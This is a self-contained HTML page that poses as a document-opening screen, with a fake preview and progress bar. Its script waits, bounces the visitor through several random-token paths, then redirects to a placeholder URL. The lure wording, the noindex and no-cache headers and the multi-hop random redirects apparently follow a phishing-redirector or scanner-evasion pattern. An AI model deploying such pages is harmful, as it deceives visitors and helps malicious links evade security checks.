<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex">
    <meta http-equiv="cache-control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="pragma" content="no-cache">
    <meta http-equiv="expires" content="0">
    <title>Document Loading</title>
    <style>
      :root {
        color-scheme: light;
        font-family:
          Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
          sans-serif;
      }

      * {
        box-sizing: border-box;
      }

      body {
        background: #eef1f4;
        color: #202631;
        margin: 0;
        min-height: 100vh;
      }

      .loading-shell {
        align-items: center;
        display: flex;
        flex-direction: column;
        justify-content: center;
        min-height: 100vh;
        padding: 40px 24px;
      }

      .document-preview {
        background: #ffffff;
        border: 1px solid #d8dde5;
        border-radius: 3px;
        box-shadow: 0 16px 40px rgba(32, 38, 49, 0.1);
        height: 330px;
        padding: 48px 42px;
        position: relative;
        width: 255px;
      }

      .document-preview::before {
        background:
          linear-gradient(#2f5fa7, #2f5fa7) 0 0 / 78px 7px no-repeat,
          linear-gradient(#d9dee6, #d9dee6) 0 36px / 168px 4px no-repeat,
          linear-gradient(#d9dee6, #d9dee6) 0 54px / 154px 4px no-repeat,
          linear-gradient(#d9dee6, #d9dee6) 0 72px / 164px 4px no-repeat,
          linear-gradient(#d9dee6, #d9dee6) 0 110px / 168px 4px no-repeat,
          linear-gradient(#d9dee6, #d9dee6) 0 128px / 144px 4px no-repeat,
          linear-gradient(#d9dee6, #d9dee6) 0 146px / 160px 4px no-repeat,
          linear-gradient(#e9edf2, #e9edf2) 0 190px / 66px 40px no-repeat,
          linear-gradient(#e9edf2, #e9edf2) 82px 190px / 86px 40px no-repeat;
        content: "";
        inset: 48px 42px;
        position: absolute;
      }

      .loading-card {
        background: #ffffff;
        border: 1px solid #d8dde5;
        border-radius: 10px;
        box-shadow: 0 12px 28px rgba(32, 38, 49, 0.12);
        margin-top: -46px;
        max-width: 460px;
        padding: 24px 26px;
        position: relative;
        width: 100%;
      }

      .loading-header {
        align-items: center;
        display: flex;
        gap: 14px;
      }

      .loader {
        border: 2px solid #dce5f2;
        border-radius: 50%;
        border-top-color: #2f5fa7;
        height: 30px;
        width: 30px;
      }

      h1 {
        font-size: 18px;
        letter-spacing: -0.015em;
        margin: 0;
      }

      .description {
        color: #727b89;
        font-size: 13px;
        line-height: 1.5;
        margin: 5px 0 0;
      }

      .progress {
        background: #e7ebf0;
        border-radius: 999px;
        height: 5px;
        margin-top: 20px;
        overflow: hidden;
      }

      .progress span {
        background: #2f5fa7;
        border-radius: inherit;
        display: block;
        height: 100%;
        width: 0;
      }

      @keyframes spin {
        to {
          transform: rotate(360deg);
        }
      }

      .loader {
        animation: spin 0.9s linear infinite;
      }

      @media (max-width: 520px) {
        .loading-shell {
          padding-inline: 18px;
        }

        .loading-card {
          padding: 22px;
        }
      }

      @media (prefers-reduced-motion: reduce) {
        *,
        *::before,
        *::after {
          animation-duration: 0.001ms !important;
          animation-iteration-count: 1 !important;
          scroll-behavior: auto !important;
        }
      }
    </style>
  </head>
  <body>
    <main class="loading-shell" aria-live="polite">
      <div class="document-preview" aria-hidden="true"></div>
      <section class="loading-card">
        <div class="loading-header">
          <span class="loader" aria-hidden="true"></span>
          <div>
            <h1>Opening your document</h1>
            <p class="description">Please keep this page open while we prepare your session.</p>
          </div>
        </div>
        <div class="progress" aria-hidden="true"><span id="loading-progress"></span></div>
      </section>
    </main>

    <script>
      (function () {
        var finalUrl = "https://test.com";
        var initialLoadingDelayMs = 7000;
        var randomRedirectDelayMs = 2000;
        var maxRandomRedirects = 3;
        var minRandomPathLength = 10;
        var storageKey = "redirectStep";
        var alphabet = "abcdefghijklmnopqrstuvwxyz0123456789";
        var tokenPattern = new RegExp("^/[A-Za-z0-9]{" + minRandomPathLength + ",}/?$");
        var currentPath = window.location.pathname.replace(/\/+$/, "");
        var progressBar = document.getElementById("loading-progress");
        var isInitialLoad = currentPath === "" || currentPath === "/index.html";
        var activeDelayMs = isInitialLoad ? initialLoadingDelayMs : randomRedirectDelayMs;
        var startedAt = Date.now();
        var requestFrame = window.requestAnimationFrame || function (callback) {
          return window.setTimeout(callback, 16);
        };

        function generateRandomPath() {
          var randomString = "";

          for (var index = 0; index < minRandomPathLength; index += 1) {
            randomString += alphabet.charAt(Math.floor(Math.random() * alphabet.length));
          }

          return "/" + randomString;
        }

        function isInitialPath() {
          return isInitialLoad;
        }

        function redirectToNextStep() {
          var currentStep = Number(window.sessionStorage.getItem(storageKey) || "0");

          if (currentStep < maxRandomRedirects) {
            window.sessionStorage.setItem(storageKey, String(currentStep + 1));
            window.location.replace(generateRandomPath());
            return;
          }

          window.sessionStorage.removeItem(storageKey);
          window.location.replace(finalUrl);
        }

        function updateProgress() {
          var elapsedMs = Date.now() - startedAt;
          var progress = Math.min(elapsedMs / activeDelayMs, 1);

          progressBar.style.width = Math.round(progress * 100) + "%";

          if (progress < 1) {
            requestFrame(updateProgress);
          }
        }

        if (!isInitialPath()) {
          if (!tokenPattern.test(window.location.pathname)) {
            window.sessionStorage.setItem(storageKey, "0");
          }
        } else {
          window.sessionStorage.setItem(storageKey, "0");
        }

        updateProgress();
        window.setTimeout(function () {
          progressBar.style.width = "100%";
          redirectToNextStep();
        }, activeDelayMs);
      }());
    </script>
  </body>
</html>
